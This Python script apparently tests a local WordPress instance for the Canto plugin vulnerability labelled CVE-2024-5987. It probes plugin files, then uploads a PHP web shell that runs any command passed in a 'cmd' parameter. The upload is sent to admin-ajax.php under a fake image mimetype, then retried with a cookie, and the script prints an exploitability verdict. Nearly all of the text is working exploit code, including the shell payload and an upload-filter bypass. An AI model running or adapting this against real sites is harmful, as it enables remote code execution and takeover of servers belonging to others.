import requests
import re

# Configuration
target_url = "http://127.0.0.1:32816"
admin_ajax_url = f"{target_url}/wp-admin/admin-ajax.php"

# First, let's verify if the Canto plugin is actually installed
# by checking for common plugin files and endpoints
print(f"[+] Checking if Canto plugin is installed...")

plugin_files = [
    "/wp-content/plugins/canto/canto.php",
    "/wp-content/plugins/canto/canto-upload.php", 
    "/wp-content/plugins/canto/uninstall.php",
    "/wp-content/plugins/canto/readme.txt"
]

plugin_found = False
for plugin_file in plugin_files:
    full_url = f"{target_url}{plugin_file}"
    try:
        resp = requests.get(full_url, timeout=10)
        print(f"[+] Checking {plugin_file}: Status {resp.status_code}")
        if resp.status_code == 200:
            print(f"[!] Found plugin file: {plugin_file}")
            plugin_found = True
    except Exception as e:
        print(f"[!] Error checking {plugin_file}: {e}")

# Check if admin-ajax.php exists and responds
try:
    print(f"\n[+] Checking admin-ajax.php accessibility...")
    ajax_check = requests.get(admin_ajax_url, timeout=10)
    print(f"[+] admin-ajax.php GET request status: {ajax_check.status_code}")
    print(f"[+] Response length: {len(ajax_check.content)}B")
    
    # admin-ajax.php typically returns 0 for GET requests, which is normal
    if ajax_check.status_code == 400:
        print(f"[!] admin-ajax.php returns 400 - this is expected for direct access")
    elif ajax_check.status_code == 200:
        print(f"[!] admin-ajax.php accessible")
        
except Exception as e:
    print(f"[!] Error checking admin-ajax.php: {e}")

# Now test the specific CVE-2024-5987 endpoint with debug info
print(f"\n[+] Testing CVE-2024-5987 exploit conditions...")
shell_name = "shell.php"
shell_content = '<?php if(isset($_REQUEST["cmd"])){echo "<pre>";passthru($_REQUEST["cmd"]);echo "</pre>";die;}?>'

# Try with more realistic file upload simulation
# Using a valid image filename but PHP content (common bypass)
files = {
    'file': ('image.php', shell_content, 'image/png'),  # Fake mimetype
    'action': (None, 'canto_upload'),
    'type': (None, 'media')
}

try:
    print(f"[+] Sending POST to admin-ajax.php with canto_upload action...")
    response = requests.post(admin_ajax_url, files=files, timeout=30)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Body: '{response.text}'")
    print(f"[+] Content-Type: {response.headers.get('content-type', 'N/A')}")
    
    # Check if response has any JSON structure (WordPress AJAX responses often do)
    if response.text.strip() and (response.text.strip().startswith('{') or response.text.strip().startswith('[')):
        try:
            import json
            json_data = json.loads(response.text)
            print(f"[+] JSON Response: {json.dumps(json_data, indent=2)}")
        except:
            print(f"[+] Response is not valid JSON")
    elif response.text.strip() == "0":
        print(f"[+] Response is '0' - typical WordPress AJAX response for failure/no-action")
        print(f"[!] This suggests 'canto_upload' action is not registered or accessible")
    
    # Check response headers for clues
    if 'x-wp-nonce' in response.headers:
        print(f"[+] Found WordPress nonce in headers")
    
    # Verify if this might be a permission issue vs. plugin not installed
    print(f"\n[+] Checking if action requires authentication...")
    
    # Try as authenticated user (with session cookie)
    cookies = {'wordpress_test_cookie': 'WP%20Cookie%20check'}
    response_auth = requests.post(admin_ajax_url, files=files, cookies=cookies, timeout=30)
    
    print(f"[+] Authenticated attempt response: {response_auth.status_code}")
    print(f"[+] Authenticated response body: '{response_auth.text}'")
    
    if response_auth.text == response.text:
        print(f"[+] Response identical - likely action doesn't exist or plugin not installed")
    elif response_auth.status_code == 200 and 'success' in response_auth.text.lower():
        print(f"[!] Authentication helped - vulnerability might work when authenticated")
    else:
        print(f"[?] Responses differ - potential authentication requirement")
        
except Exception as e:
    print(f"[!] Error: {e}")

# Final assessment
print(f"\n[+]=== CVE-2024-5987 Vulnerability Assessment ===")
if not plugin_found:
    print(f"[!] Canto plugin DOES NOT appear to be installed")
    print(f"[!] CVE-2024-5987 is NOT applicable - plugin not present")
elif response.text == "0":
    print(f"[!] Plugin might be installed but 'canto_upload' action returns 0")
    print(f"[!] Either action is not registered or requires different parameters")
    print(f"[!] CVE-2024-5987 may not be exploitable in current state")
else:
    print(f"[?] Inconclusive results - further testing needed")
